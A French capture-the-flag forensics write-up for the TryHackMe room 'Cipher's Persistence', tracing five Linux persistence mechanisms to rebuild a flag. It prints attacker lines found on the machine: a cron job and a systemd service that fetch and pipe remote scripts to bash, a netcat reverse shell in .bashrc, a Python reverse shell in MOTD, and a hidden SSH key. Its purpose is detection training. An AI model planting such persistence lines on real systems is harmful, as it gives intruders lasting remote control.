@@ -1,0 +1,215 @@
+# Cipher's Persistence — Write-up
+
+**Catégorie** : Forensics | **Plateforme** : TryHackMe | **Difficulté** : Easy | **Date** : avril 2026
+
+---
+
+## Contexte
+
+Une note laissée par l'attaquant "Cipher" décrit 5 mécanismes de persistance implantés sur le système, chacun avec un indice :
+
+- *"Time is on my side, always running like clockwork"*
+- *"A secret handshake gets me in every time"*
+- *"Whenever you set the stage, I make my entrance"*
+- *"I run with the big dogs, booting up alongside the system"*
+- *"I love welcome messages"*
+
+Chaque mécanisme cache un fragment de flag. Objectif : tous les trouver.
+
+---
+
+## Contexte système
+
+```bash
+whoami && uname -a && date
+```
+
+```
+ubuntu
+Linux ip-10-130-179-80 6.8.0-1016-aws
+Sun Apr  5 18:47:41 UTC 2026
+```
+
+Heure UTC notée — base pour la timeline.
+
+---
+
+## Comptes suspects
+
+```bash
+cat /etc/passwd
+```
+
+Cinq comptes utilisateurs avec home directory et shell bash actif, visiblement créés par l'attaquant :
+
+```
+void:x:1001:1001:,,,:/home/void:/bin/bash
+zeroday:x:1002:1002:,,,:/home/zeroday:/bin/bash
+phantom:x:1003:1003:,,,:/home/phantom:/bin/bash
+specter:x:1004:1004:,,,:/home/specter:/bin/bash
+sentinel:x:1005:1005:,,,:/home/sentinel:/bin/bash
+```
+
+```bash
+ls -la /home/
+```
+
+`zeroday` se distingue — créé le 13 mars vs 7 mars pour les autres, et contient un sous-dossier `.ssh`.
+
+---
+
+## Mécanisme 1 — Crontab (Time is on my side)
+
+```bash
+cat /var/spool/cron/crontabs/void
+```
+
+```
+* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
+```
+
+Décodage du payload :
+
+```bash
+echo "Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK" | base64 -d
+```
+
+```
+curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
+```
+
+Téléchargement et exécution d'un script distant toutes les minutes, silencieux (`2>/dev/null`), sans écriture sur disque. Le sous-domaine `54484d7b7930` est du hex :
+
+```bash
+on passe à cyberchef
+# THM{y0
+```
+
+**Fragment 1 : `THM{y0`**
+
+---
+
+## Mécanisme 2 — Clé SSH (Secret handshake)
+
+```bash
+ls -la /home/zeroday/.ssh/
+cat /home/zeroday/.ssh/.authorized_keys
+```
+
+```
+ecdsa-sha2-nistp256 AAAA...BGA= 326e6420706172743a20755f6730745f.local
+```
+
+Deux anomalies : le fichier s'appelle `.authorized_keys` (caché par le point) et le commentaire de la clé contient du hex :
+
+```bash
+on passe à cyberchef
+# 2nd part: u_g0t_
+```
+
+**Fragment 2 : `u_g0t_`**
+
+---
+
+## Mécanisme 3 — Bashrc (Whenever you set the stage)
+
+```bash
+cat /home/specter/.bashrc
+```
+
+```bash
+nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
+```
+
+Reverse shell netcat déclenché à chaque ouverture de session de l'utilisateur `specter`. Le sous-domaine est du hex encodant du base64 :
+
+```bash
+on passe à cyberchef
+# 3rd part: 3v3ryt
+```
+
+**Fragment 3 : `3v3ryt`**
+
+---
+
+## Mécanisme 4 — Service systemd (I run with the big dogs)
+
+Premier réflexe :
+
+```bash
+systemctl list-units --type=service --state=running
+```
+
+`badr.service` apparaît — service suspect avec LPE, hiding, execve dans ses logs. Mais ce n'est pas lui qui contient le fragment.
+
+**Erreur de méthode** : `--state=running` ne montre que les services actifs au moment de l'investigation. Un service installé mais inactif est invisible. La bonne approche :
+
+```bash
+ls /lib/systemd/system/
+ls /etc/systemd/system/
+```
+
+`cipher.service` est dans `/lib/systemd/system/` — emplacement moins évident, utilisé pour faire passer un service pour légitime.
+
+```bash
+cat /lib/systemd/system/cipher.service
+```
+
+```ini
+[Service]
+ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null'
+```
+
+```bash
+echo "NHRoIHBhcnQgLSBoMW5nXyAK" | base64 -d
+# 4th part: h1ng_
+```
+
+**Fragment 4 : `h1ng_`**
+
+---
+
+## Mécanisme 5 — MOTD (I love welcome messages)
+
+```bash
+cat /etc/update-motd.d/00-header
+```
+
+```bash
+python3 -c 'import socket,subprocess,os; s=socket.socket(...); s.connect(("4c61737420706172743a206430776e7d.h1dd3nd00r.n3t",)); ...' 2>/dev/null
+```
+
+Reverse shell Python injecté dans le MOTD — se déclenche à chaque connexion SSH sur la machine. C'est le mécanisme le plus discret : aucun fichier suspect dans les processus, aucun service visible, juste un script d'affichage système modifié.
+
+```bash
+on passe à cyberchef
+# Last part: d0wn}
+```
+
+**Fragment 5 : `d0wn}`**
+
+---
+
+## Flag
+
+**`THM{y0u_g0t_3v3ryth1ng_d0wn}`**
+
+---
+
+## Récapitulatif
+
+| Indice | Mécanisme | Localisation | Fragment |
+|---|---|---|---|
+| Time is on my side | Crontab + curl/bash | `crontab -u void` | `THM{y0` |
+| Secret handshake | Clé SSH cachée (.authorized_keys) | `/home/zeroday/.ssh/` | `u_g0t_` |
+| Whenever you set the stage | Netcat dans .bashrc | `/home/specter/.bashrc` | `3v3ryt` |
+| I run with the big dogs | Service systemd inactif | `/lib/systemd/system/cipher.service` | `h1ng_` |
+| I love welcome messages | Reverse shell dans MOTD | `/etc/update-motd.d/00-header` | `d0wn}` |
+
+---
+
+## Ce que j'ai raté et pourquoi
+
+`cipher.service` a failli m'échapper. `systemctl list-units --state=running` ne retourne que les services actifs au moment de l'investigation — un service installé mais arrêté est invisible. On a supposé à tort que tous les mécanismes actifs seraient visibles dans les processus.
+
+Leçon : toujours auditer les fichiers directement (`/etc/systemd/system/`, `/lib/systemd/system/`) en plus des processus actifs. Un attaquant peut installer un service qui s'exécute une fois au boot puis s'arrête — il disparaît des listes mais reste en place.
